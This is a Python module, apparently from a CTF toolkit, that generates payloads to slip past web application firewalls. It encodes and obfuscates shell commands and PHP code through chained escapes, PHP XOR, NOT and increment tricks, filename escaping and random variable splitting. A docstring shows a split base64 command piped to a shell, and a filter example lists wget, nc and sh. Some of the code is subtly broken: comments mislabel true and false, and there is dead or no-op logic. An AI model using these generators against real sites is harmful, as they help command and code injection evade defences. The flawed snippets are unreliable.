import base64
import re
import urllib.parse


def parse_waf_words(waf_words: str):
    """
    解析 WAF 过滤字符串
    以 " | " 作为分割
    Example: wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings
    """
    if not waf_words:
        return []
    parts = [p.strip() for p in waf_words.split("|") if p.strip()]
    cleaned = []
    for token in parts:
        token = _strip_regex_delimiters(token)
        if token:
            cleaned.append(token)
    return cleaned


def parse_waf_chars(waf_chars: str):
    """
    解析 WAF 过滤字符
    Example: $#!@.
    """
    if not waf_chars:
        return set()
    return {ch for ch in waf_chars if not ch.isspace()}


def parse_waf_regex(waf_regex: str):
    """
    解析 WAF 正则表达
    需要用 / ... / 进行包裹
    Example: /[A-Za-z0-9_$]/
    """
    if not waf_regex:
        return None
    pattern = waf_regex.strip()
    flags = 0
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        flag_str = pattern[last + 1 :]
        pattern = pattern[1:last]
        flags |= _parse_regex_flags(flag_str)
    try:
        return re.compile(pattern, flags)
    except re.error:
        return None


def dedupe_preserve_order(items):
    """
    在保持顺序的前提下去重
    """
    seen = set()
    result = []
    for item in items:
        if item in seen:
            continue
        seen.add(item)
        result.append(item)
    return result


def is_payload_allowed(payload: str, waf_words, waf_chars, waf_regex, limit_length: int):
    """
    检查 payload 是否可通过 WAF
    """
    if limit_length is not None and len(payload) > limit_length:
        return False
    if waf_words:
        lower_payload = payload.lower()
        for word in waf_words:
            if word and word.lower() in lower_payload:
                return False
    if waf_chars:
        for ch in payload:
            if ch in waf_chars:
                return False
    if waf_regex and waf_regex.search(payload):
        return False
    return True


def url_encode(payload: str):
    """
    URL 编码
    """
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str):
    """
    双重 URL 编码
    """
    return urllib.parse.quote(url_encode(payload), safe="")


def unicode_escape_encode(payload: str):
    """
    Unicode 转义编码
    """
    return "".join("\\u%04x" % ord(ch) for ch in payload)


def hex_escape_encode(payload: str):
    """
    十六进制转义编码
    """
    return "".join("\\x%02x" % ord(ch) for ch in payload)


def octal_escape_encode(payload: str):
    """
    八进制转义编码
    """
    return "".join("\\%03o" % ord(ch) for ch in payload)


def base64_encode(payload: str):
    """
    Base64 编码
    """
    data = payload.encode("utf-8")
    return base64.b64encode(data).decode("ascii")


def generate_php_chr(text: str):
    """
    PHP chr 拼接
    Example: chr(112).chr(104).chr(112)
    """
    data = text.encode("utf-8")
    if not data:
        return "''"
    return ".".join(f"chr({byte})" for byte in data)


def generate_php_xor(text: str):
    """
    PHP 异或
    Example: ('%xx'^'%xx')...
    """
    xor_str1 = ""
    xor_str2 = ""
    for char in text:
        found = False
        # 寻找两个非字母数字字符，使其异或结果等于目标字符
        for i in range(256):
            if found:
                break
            c1 = chr(i)
            if c1.isalnum():
                continue
            for j in range(256):
                c2 = chr(j)
                if c2.isalnum():
                    continue
                if (ord(c1) ^ ord(c2)) == ord(char):
                    xor_str1 += "%" + hex(i)[2:].zfill(2)
                    xor_str2 += "%" + hex(j)[2:].zfill(2)
                    found = True
                    break

    if len(xor_str1) // 3 != len(text):
        return None 
    
    return f"('{xor_str1}'^'{xor_str2}')"


def generate_php_not(text: str):
    """
    PHP 按位取反
    Example: ~%xx%xx...
    """
    not_str = ""
    for char in text:
        byte_val = ord(char)
        not_val = (~byte_val) & 0xFF
        not_char = chr(not_val)
        if not_char.isalnum():
            pass
        not_str += "%" + hex(not_val)[2:].zfill(2)
    return f"(~'{not_str}')"


def generate_php_increment(text: str):
    """
    PHP 自增
    """

    payload = "$_=[].'';"   # $_ 先得到数组字符串
    variables = {}          # 字符到变量名映射

    code_parts = []
    code_parts.append("$_=[].''")  # 数组字符串

    if not text.isalpha():
        return None  # 仅支持纯字母命令

    zero = "([]!=[])"   # true
    one = "([]==[])"    # false
    three = f"({one}+{one}+{one})"

    # 初始化关键字符
    # 取出大写起始字符
    # 取出小写起始字符
    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)

    # 构建目标字符串
    res_var = "$_____"
    iter_var = "$____"

    parts = [
        "$_=[].''",
        "$__=$_[[]!=[]]",
        "$___=$_[[]==[]+[]==[]+[]==[]]",
        f"{res_var}=_",
    ]

    parts.pop()
    parts.append(f"{res_var}=''")  # $_____ = ""

    for char in text:
        if "A" <= char <= "Z":
            base = "A"
            base_var = "$__"
        else:
            base = "a"
            base_var = "$___"

        diff = ord(char) - ord(base)

        # 设置迭代变量
        parts.append(f"{iter_var}={base_var}")

        if diff > 0:
            parts.append(f"{iter_var}++" * diff)

        parts.append(f"{res_var}.={iter_var}")

    return ";".join(parts)


def obfuscate_filename_escape(path: str):
    """
    插入转义符 "\\"
    Example: flag.php -> fl\ag.php
    """
    if not path or len(path) < 2:
        return path

    parts = list(path)

    # 随机插入
    if len(parts) > 3:
        import random

        idx = random.randint(1, len(parts) - 1)
        if parts[idx].isalnum():
            parts.insert(idx, "\\")

    return "".join(parts)


def obfuscate_filename_quotes(path: str):
    """
    插入空引号 ''
    Example: flag.php -> fl''ag.php
    """
    if not path or len(path) < 2:
        return path

    parts = list(path)
    if len(parts) > 3:
        import random

        idx = random.randint(1, len(parts) - 1)
        if parts[idx].isalnum():
            parts.insert(idx, "''")

    return "".join(parts)


def _split_string_to_vars(text: str):
    """
    随机拆分字符串并分配给随机变量
    主要和变量拆分绕过适配
    Example: b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c
    return: (assignment_str, concatenation_str)
    """
    import random
    import string

    if not text:
        return "", ""

    # 生成随机切分点
    length = len(text)
    if length == 1:
        splits = [text]
    else:
        # 随机切成 2 到 4 段
        num_parts = random.randint(2, min(length, 4))
        # 生成随机切分索引
        indices = sorted(random.sample(range(1, length), num_parts - 1))
        indices = [0] + indices + [length]

        splits = []
        for i in range(len(indices) - 1):
            splits.append(text[indices[i] : indices[i + 1]])

    # 分配到随机变量
    assignments = []
    vars_used = []

    available_chars = string.ascii_lowercase

    for part in splits:
        var_name = random.choice(available_chars)
        while var_name in vars_used:
            var_name = random.choice(available_chars) + random.choice(available_chars)

        vars_used.append(var_name)
        assignments.append(f"{var_name}={part}")

    concat_str = "".join([f"${v}" for v in vars_used])
    assign_str = ";".join(assignments) + ";"

    return assign_str, concat_str


def get_encoding_strategies():
    """
    获取所有编码策略
    """
    return [
        ("url", url_encode),
        ("double_url", double_url_encode),
        ("unicode_escape", unicode_escape_encode),
        ("hex_escape", hex_escape_encode),
        ("octal_escape", octal_escape_encode),
        ("raw", lambda s: s),
    ]


def _strip_regex_delimiters(token: str):
    """
    剥离正则表达式分隔符
    """
    token = token.strip()
    if token.startswith("/") and token.endswith("/"):
        return token[1:-1]
    if token.startswith("/") and token.count("/") >= 2:
        last = token.rfind("/")
        return token[1:last]
    lower = token.lower()
    if lower.endswith("/i") or lower.endswith("/s") or lower.endswith("/m"):
        return token[:-2]
    if lower.endswith("/is") or lower.endswith("/im") or lower.endswith("/sm"):
        return token[:-3]
    return token


def _parse_regex_flags(flag_str: str):
    """
    解析正则
    """
    flags = 0
    for ch in flag_str:
        if ch == "i":
            flags |= re.IGNORECASE
        elif ch == "s":
            flags |= re.DOTALL
        elif ch == "m":
            flags |= re.MULTILINE
    return flags
